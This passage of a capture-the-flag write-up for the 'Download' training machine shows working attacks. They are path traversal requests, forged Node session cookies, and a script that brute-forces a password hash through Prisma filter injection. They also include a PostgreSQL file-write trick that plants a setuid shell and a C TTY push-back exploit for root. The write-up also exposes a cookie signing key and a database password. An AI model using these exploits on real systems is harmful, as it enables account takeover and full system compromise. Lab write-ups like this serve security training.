Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 09:14:24 GMT
Content-Type: application/octet-stream
Content-Length: 310
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"136-187a46bed31"

{% extends "base.njk" %} {% block body %} {% include "flash.njk" %}
<h2>Hey {{ user.username }}!</h2>

<h3>Your uploaded files:</h3>
{% for file in files %}
<hr />
{% include "file.njk" %} {% endfor %} {% if not files.length %}
<h4 class="text-center text-muted">No files found</h4>
{% endif %} {% endblock %}
```

Modified Request:

```c
GET /files/download/%2e%2e%2fviews%2ffile.njk HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 09:15:54 GMT
Content-Type: application/octet-stream
Content-Length: 1706
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:40:13 GMT
ETag: W/"6aa-187a4791eda"

{% set fileTypes =
["aac","ai","bmp","cs","css","csv","doc","docx","exe","gif","heic","html","java","jpg","js","json","jsx","key","m4p","md","mdx","mov","mp3","mp4","otf","pdf","php","png","ppt","pptx","psd","py","raw","rb","sass","scss","sh","sql","svg","tiff","tsx","ttf","txt","wav","woff","xls","xlsx","xml","yml"]
%}

<div>
  <div class="row">
    <div class="col-auto">
      <div style="font-size: 80px; text-align: center">
        {% set fileName = file.name %} {% set splitFile = fileName.split('.') %} {% set fileExtension = splitFile[splitFile.length - 1] %}
        {% if fileExtension in fileTypes %}
        <i class="bi-filetype-{{ fileExtension }}"></i>
        {% else %}
        <i class="bi-earmark" class="fs-6"></i>

        {% endif %}
      </div>
    </div>
    <div class="col-9">
      <h4>{{ file.name }}{% if file.private %}<span class="text-danger"> (Private)</span>{%endif%}</h4>
      <p>
        <strong>Uploaded At: </strong>{{ file.uploadedAt }}<br />
        <strong>Uploaded By: </strong>{{ file.author.username if file.authorId else "Anonymous" }}<br />
      </p>
    </div>
  </div>

  <div class="row">
    <div class="col-4">
      <a download href="/files/download/{{ file.id }}" class="btn btn-primary w-100">Download</a>
    </div>
    <div class="col-4">
      <a onclick="copyToClipboard('http://download.htb/files/view/{{ file.id }}')" class="btn btn-success w-100">Copy Link</a>
    </div>
    {% if user and file.authorId == user.id %}
    <div class="col-4">
      <form action="/files/delete/{{ file.id }}" method="POST">
        <button type="submit" class="btn btn-danger w-100">Delete</button>
      </form>
    </div>
    {% endif %}
  </div>
</div>
```

Modified Request:

```c
GET /files/download/%2e%2e%2fviews%2fview.njk HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 09:17:11 GMT
Content-Type: application/octet-stream
Content-Length: 108
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"6c-187a46bed31"

{% extends "base.njk" %} {% block body %} {% include "flash.njk" %} {% include "file.njk" %} {% endblock %}
```

Modified Request:

```c
GET /files/download/%2e%2e%2fviews%2fflash.njk HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 09:17:48 GMT
Content-Type: application/octet-stream
Content-Length: 402
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"192-187a46bed31"

{% if flashes %} {% if flashes.info %}
<div class="alert alert-primary">
  {{ flashes.info | safe }}
</div>
{% endif %} {% if flashes.error %}
<div class="alert alert-danger"><strong>Something went wrong!</strong> {{ flashes.error | safe }}</div>
{% endif %} {% if flashes.success %}
<div class="alert alert-success"><strong>Awesome!</strong> {{ flashes.success | safe }}</div>
{% endif %} {% endif %}
```

Modified Request:

```c
GET /files/download/%2e%2e%2fviews%2fupload.njk HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19; download_session.sig=cUubQGXV9r7989Yb22S8H6wp3EM
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Response:

```c
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 09:18:43 GMT
Content-Type: application/octet-stream
Content-Length: 884
Connection: close
X-Powered-By: Express
Content-Disposition: attachment; filename="Unknown"
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 21 Apr 2023 15:25:49 GMT
ETag: W/"374-187a46bed31"

{% extends "base.njk" %} {% block body %}
<h1 class="text-center">Upload a file</h1>
<h3 class="mb-4 text-center">Select your file and get sharing now.</h3>

{% include "flash.njk" %}

<form method="POST" action="/files/upload" enctype="multipart/form-data">
  <div class="mb-3">
    <input class="form-control" type="file" name="file" required />
  </div>

  {% if user %}
  <div class="mb-3">
    <label class="form-label">Mark file as private</label>
    <select class="form-select" name="private" required>
      <option value="false">No</option>
      <option value="true">Yes</option>
    </select>
    <span class="text-muted">Private files are only downloadable by you.</span>
  </div>
  {% endif %}

  <div class="row">
    <div class="col-4 offset-4">
      <button type="submit" class="btn btn-primary w-100">Upload Now</button>
    </div>
  </div>
</form>

{% endblock %}
```

## Forging NodeJS Cookies with cookie-monster

> https://github.com/DigitalInterruption/cookie-monster

```c
$ git clone https://github.com/DigitalInterruption/cookie-monster
Cloning into 'cookie-monster'...
remote: Enumerating objects: 88, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (28/28), done.
remote: Total 88 (delta 16), reused 14 (delta 5), pack-reused 55
Receiving objects: 100% (88/88), 77.91 KiB | 1.81 MiB/s, done.
Resolving deltas: 100% (33/33), done.
```

```c
$ sudo npm install --global yarn

added 1 package in 1s
```

```c
$ yarn install                  
yarn install v1.22.19
[1/4] Resolving packages...
[2/4] Fetching packages...
[3/4] Linking dependencies...
[4/4] Building fresh packages...
Done in 7.29s.
```

```c
$ yarn global add @digital-interruption/cookie-monster
yarn global v1.22.19
[1/4] Resolving packages...
warning @digital-interruption/cookie-monster > request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142
warning @digital-interruption/cookie-monster > request > har-validator@5.1.5: this library is no longer supported
warning @digital-interruption/cookie-monster > request > uuid@3.4.0: Please upgrade  to version 7 or higher.  Older versions may use Math.random() in certain circumstances, which is known to be problematic.  See https://v8.dev/blog/math-random for details.
[2/4] Fetching packages...
[3/4] Linking dependencies...
[4/4] Building fresh packages...
success Installed "@digital-interruption/cookie-monster@1.0.2" with binaries:
      - cookie-monster
Done in 10.01s.
```

```c
$ echo 'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZm9vYmFyIn19' | base64 -d                                                                                           
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"foobar"}}
```

Custom Cookie:

```c
$ cat cookie.json 
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":1,"username":"wesley"}}
```

```c
$ /home/user/.yarn/bin/cookie-monster -e -f cookie.json -k 8929874489719802418902487651347865819634518936754 -n download_session
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /

[+] Data Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MSwidXNlcm5hbWUiOiJ3ZXNsZXkifX0=
[+] Signature Cookie: download_session.sig=qQxQdv3ZjZbAddoDzP0zXSakQcI
```

We replaced the `cookie` and the `signature` by using the `Developer Tools` and it worked.

## User Enumeration

```c
$ cat enum.json 
{"user":{"id":1}}
```

```c
$ /home/user/.yarn/bin/cookie-monster -e -f enum.json -k 8929874489719802418902487651347865819634518936754 -n download_session
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /

[+] Data Cookie: download_session=eyJ1c2VyIjp7ImlkIjoxfX0=
[+] Signature Cookie: download_session.sig=CIdiz217BVhPMCi2PN8zK0mYK0k
```

| Username | ID |
| --- | --- |
| Wesley | 1 |
| Hindermate | 2 |
| Bold_pecAplomb | 3 |
| Tabific | 4 |
| AyufmApogee | 5 |
| Jalouse | 6 |
| Logorrhea | 7 |
| n/a | 8 |
| Pestiferous | 9 |
| Antilogism | 10 |
| Vivacious | 11 |
| Rooirhebok | 12 |
| Apoplectic | 13 |
| StrachanMilt | 14 |
| ZitaShneee | 15 |

## Foothold

### Password Bruteforce via custom crafted Cookies

> https://www.prisma.io/docs/concepts/components/prisma-client/raw-database-access

> https://github.com/prisma/prisma/discussions/19533

```c
{"flashes":{"info":[],"error":[],"success":[]},"user":{"username":{"contains": "wesley"}, "password":{"startsWith":"<NEED_TO_BE_BRUTE_FORCED>"}}}
```

Again... a huge shoutout to `xvt` for this awesome script!!

```c
$ cat brute.py 
import requests
import subprocess
import json
import re
import base64

username = 'WESLEY'
password = ''
download_session_json = {
        "user": {
                "username": {
                        "contains": username
                },
                "password": {
                        "startsWith": password
                }
        }
}

BASE_URL = 'http://download.htb'

def getCookie(username, password):

        download_session_json["user"]["username"]["contains"] = username
        download_session_json["user"]["password"]["startsWith"] = password

        with open('download_session.json', 'w') as f:
                f.write(json.dumps(download_session_json,indent=2))

        out = subprocess.check_output([
                "cookie-monster",
                "-k", '8929874489719802418902487651347865819634518936754',
                "-n", 'download_session',
                "-f", 'download_session.json'
                ,"-e"]).decode('utf-8')

        download_session = re.search(r'download_session=([a-zA-Z0-9_\-=]+)', out).group(1)
        download_session_sig = re.search(r'download_session.sig=([a-zA-Z0-9_\-=]+)', out).group(1)

        #print(json.dumps(json.loads(base64.b64decode(download_session).decode('utf-8')),indent=2))

        return {
                "download_session": download_session,
                "download_session.sig": download_session_sig
        }

if __name__ == '__main__':

        hex_chars = '0123456789abcdef'

        for i in range(32):
                for c in hex_chars: 
                        p = password + c  
                        print(p, end='\r')
                        r = requests.get(
                                url             = BASE_URL + '/home/',
                                cookies = getCookie('WESLEY', p)
                        )
                        if len(r.text) != 2174:
                                password = p
                                break
```

```c
$ cat cookie.json 
{"user": {"username": {"contains": "WESLEY"}, "password": {"startsWith": "f88<--- SNIP --->bd3"}}}
```

> https://crackstation.net/

| Username | Password |
| --- | --- |
| wesley | f88<--- SNIP --->bd3 |

```c
$ ssh wesley@download.htb
The authenticity of host 'download.htb (10.129.126.79)' can't be established.
ED25519 key fingerprint is SHA256:I0UEhPwwqSoDLGgboDmJ5hAHx5IJs4Fj4g8KDbJtjEo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'download.htb' (ED25519) to the list of known hosts.
wesley@download.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 06 Aug 2023 04:13:45 PM UTC

  System load:           0.72
  Usage of /:            58.2% of 5.81GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             316
  Users logged in:       0
  IPv4 address for eth0: 10.129.126.79
  IPv6 address for eth0: dead:beef::250:56ff:fe96:6a95


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  3 08:29:52 2023 from 10.10.14.23
wesley@download:~$
```

## user.txt

```c
wesley@download:~$ cat user.txt
d4b53d6cf1cdc507bd0c1eeaf3e22ef5
```

## Enumeration

```c
wesley@download:~$ id
uid=1000(wesley) gid=1000(wesley) groups=1000(wesley)
```

```c
wesley@download:~$ sudo -l
[sudo] password for wesley: 
Sorry, user wesley may not run sudo on download.
```

```c
wesley@download:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
wesley:x:1000:1000:wesley:/home/wesley:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postgres:x:113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
fwupd-refresh:x:114:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

```c
wesley@download:~$ ls -la
total 40
drwxr-xr-x 5 wesley wesley 4096 Jul 19 15:35 .
drwxr-xr-x 3 root   root   4096 Jul 19 15:35 ..
lrwxrwxrwx 1 root   root      9 Apr 21 14:33 .bash_history -> /dev/null
-rw-r--r-- 1 wesley wesley  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 wesley wesley 3771 Feb 25  2020 .bashrc
drwx------ 2 wesley wesley 4096 Jul 19 15:35 .cache
drwxrwxr-x 3 wesley wesley 4096 Jul 19 15:35 .local
-rw-r--r-- 1 wesley wesley  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Apr 21 14:33 .psql_history -> /dev/null
drwx------ 2 wesley wesley 4096 Jul 19 15:35 .ssh
-rw-r----- 1 root   wesley   33 Aug  5 19:02 user.txt
-rw-r--r-- 1 wesley wesley   39 Jul 17 11:58 .vimrc
```

```c
wesley@download:~$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*
tcp                     LISTEN                   0                        511                                            127.0.0.1:3000                                            0.0.0.0:*
tcp                     LISTEN                   0                        244                                            127.0.0.1:5432                                            0.0.0.0:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*
```

```c
wesley@download:~$ w
 16:18:22 up 21:17,  2 users,  load average: 0.08, 0.16, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
wesley   pts/0    10.10.16.15      16:13    0.00s  0.09s  0.00s w
root     pts/1    127.0.0.1        16:17   29.00s  0.07s  0.05s /usr/lib/postgresql/12/bin/psql
```

```c
wesley@download:~$ ls -la /usr/lib/postgresql/12/bin/psql
-rwxr-xr-x 1 root root 699840 May 11 19:58 /usr/lib/postgresql/12/bin/psql
```

```c
wesley@download:~$ /usr/lib/postgresql/12/bin/psql
psql: error: FATAL:  role "wesley" does not exist
```

```c
wesley@download:~$ last
root     pts/1        127.0.0.1        Sun Aug  6 16:17 - 16:18  (00:00)
root     pts/1        127.0.0.1        Sun Aug  6 16:16 - 16:16  (00:00)
root     pts/1        127.0.0.1        Sun Aug  6 16:14 - 16:15  (00:00)
wesley   pts/0        10.10.16.15      Sun Aug  6 16:13   still logged in
root     pts/0        127.0.0.1        Sun Aug  6 16:13 - 16:13  (00:00)
root     pts/0        127.0.0.1        Sun Aug  6 16:11 - 16:11  (00:00)
root     pts/0        127.0.0.1        Sun Aug  6 16:09 - 16:10  (00:00)
<--- SNIP --->
root     pts/0        127.0.0.1        Sat Aug  5 19:05 - 19:06  (00:00)
root     pts/0        127.0.0.1        Sat Aug  5 19:04 - 19:04  (00:00)
root     pts/0        127.0.0.1        Sat Aug  5 19:02 - 19:03  (00:00)
reboot   system boot  5.4.0-155-generi Sat Aug  5 19:01   still running
wesley   pts/1        10.10.14.23      Thu Aug  3 08:29 - 08:30  (00:01)
root     pts/0        127.0.0.1        Thu Aug  3 08:29 - 08:30  (00:00)
root     pts/0        127.0.0.1        Thu Aug  3 08:28 - 08:28  (00:00)
reboot   system boot  5.4.0-155-generi Thu Aug  3 08:26 - 08:30  (00:04)
root     pts/1        127.0.0.1        Tue Aug  1 11:35 - down   (00:00)
root     pts/1        127.0.0.1        Tue Aug  1 11:34 - 11:34  (00:00)
wesley   pts/0        10.10.14.46      Tue Aug  1 11:33 - 11:35  (00:02)
reboot   system boot  5.4.0-155-generi Tue Aug  1 11:32 - 11:35  (00:02)
root     pts/2        127.0.0.1        Tue Aug  1 11:31 - 11:32  (00:00)
root     pts/2        127.0.0.1        Tue Aug  1 11:29 - 11:30  (00:00)
root     pts/1        127.0.0.1        Tue Aug  1 11:28 - 11:28  (00:00)
root     pts/1        127.0.0.1        Tue Aug  1 11:26 - 11:27  (00:00)
wesley   pts/0        10.10.14.46      Tue Aug  1 11:25 - 11:32  (00:06)
reboot   system boot  5.4.0-153-generi Tue Aug  1 11:25 - 11:32  (00:07)
root     pts/1        127.0.0.1        Tue Aug  1 11:24 - down   (00:00)
wesley   pts/0        10.10.14.46      Tue Aug  1 11:23 - 11:24  (00:01)
wesley   pts/0        10.10.14.46      Tue Aug  1 11:23 - 11:23  (00:00)
root     pts/1        127.0.0.1        Tue Aug  1 11:23 - 11:23  (00:00)
root     pts/1        127.0.0.1        Tue Aug  1 11:21 - 11:22  (00:00)
wesley   pts/0        10.10.14.46      Tue Aug  1 11:20 - 11:23  (00:02)
reboot   system boot  5.4.0-153-generi Tue Aug  1 11:20 - 11:25  (00:04)

wtmp begins Tue Aug  1 11:20:09 2023
```

```c
wesley@download:~$ find / -perm -4000 2>/dev/null | xargs ls -la
-rwsr-sr-x 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root   root        53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root   root        39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root        88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        55528 May 30 15:42 /usr/bin/mount
-rwsr-xr-x 1 root   root        44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root   root        31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root   root        67816 May 30 15:42 /usr/bin/su
-rwsr-xr-x 1 root   root       166056 Apr  4 11:56 /usr/bin/sudo
-rwsr-xr-x 1 root   root        39144 May 30 15:42 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus  51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       473576 Jul 19 19:56 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
```

```c
wesley@download:~$ uname -a
Linux download 5.4.0-155-generic #172-Ubuntu SMP Fri Jul 7 16:10:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

```c
wesley@download:/dev/shm$ ls -la
total 16
drwxrwxrwt  2 root     root        60 Aug  5 19:01 .
drwxr-xr-x 18 root     root      3980 Aug  5 19:01 ..
-rw-------  1 postgres postgres 16192 Aug  5 19:01 PostgreSQL.787189723
```

```c
wesley@download:/dev/shm$ psql --version
psql (PostgreSQL) 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1)
```

```c
wesley@download:~$ cat /etc/systemd/system/download-site.service 
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"

[Install]
WantedBy=multi-user.target
```

| Username | Password |
| --- | --- |
| download | CoconutPineappleWatermelon |

```c
wesley@download:~$ ls -la /var/lib/postgresql/
total 16
drwxr-xr-x  3 postgres postgres 4096 Aug  6 18:16 .
drwxr-xr-x 42 root     root     4096 Aug  5 23:38 ..
drwxr-xr-x  3 postgres postgres 4096 Apr 21 08:52 12
-rw-------  1 postgres postgres    5 Aug  6 18:16 .bash_history
-rw-------  1 postgres postgres    0 Aug  6 18:16 .psql_history
```

```c
2023/08/07 06:43:49 CMD: UID=0     PID=60036  | su -l postgres
```

## Postresql

```c
wesley@download:~$ psql -h 127.0.0.1 -U download
Password for user download: 
psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

download=>
```

```c
download=> \list
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 download  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =Tc/postgres         +
           |          |          |             |             | postgres=CTc/postgres+
           |          |          |             |             | download=CTc/postgres
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

```c
download=> \du
                                          List of roles
 Role name |                         Attributes                         |        Member of        
-----------+------------------------------------------------------------+-------------------------
 download  |                                                            | {pg_write_server_files}
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
```

## Privilege Escalation to postgres

```c
wesley@download:/var/lib/postgresql$ export PGPASSWORD='CoconutPineappleWatermelon';psql -h 127.0.0.1 -U 'download' -c "COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
COPY 1
```

```c
wesley@download:/var/lib/postgresql$ ./bash -P
bash-5.0$ id
uid=1000(wesley) gid=1000(wesley) euid=113(postgres) groups=1000(wesley)
```

## Privilege Escalation to root by using TTY Push Back

We searched for `su tty hijack` and found the following articles.

> https://seclists.org/oss-sec/2011/q2/582

> https://github.com/Duncaen/OpenDoas/issues/106

> https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking

> https://security.stackexchange.com/questions/136748/tty-push-back-priv-escalation

```c
$ cat exploit.c 
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\ncp /bin/bash /tmp/bash; chmod u+s /tmp/bash\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

```c
$ gcc exploit.c -static
```

```c
$ ll
total 740
-rwxrwx--- 1 root vboxsf 751728 Aug  7 06:48 a.out
-rwxrwx--- 1 root vboxsf    433 Aug  7 06:48 exploit.c
```

```c
$ cp a.out exp
```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
bash-5.0$ chmod +x exp
```

```c
bash-5.0$ export PGPASSWORD='CoconutPineappleWatermelon';psql -h 127.0.0.1 -U 'download' -c "COPY (SELECT CAST('/tmp/exp' AS text)) TO '/var/lib/postgresql/.profile';"
COPY 1
bash-5.0$ export PGPASSWORD='CoconutPineappleWatermelon';psql -h 127.0.0.1 -U 'download' -c "COPY (SELECT CAST('/tmp/exp' AS text)) TO '/var/lib/postgresql/.bashrc';"
COPY 1
bash-5.0$ export PGPASSWORD='CoconutPineappleWatermelon';psql -h 127.0.0.1 -U 'download' -c "COPY (SELECT CAST('/tmp/exp' AS text)) TO '/var/lib/postgresql/.bash_profile';"
COPY 1
```

INFO: We had to run it several times to make it work!

```c
bash-5.0$ ls -la
total 2676
drwxrwxrwt 12 root     root      4096 Aug  7 07:27 .
drwxr-xr-x 19 root     root      4096 Jul 19 16:06 ..
-rwsr-xr-x  1 root     root   1183448 Aug  7 07:27 bash
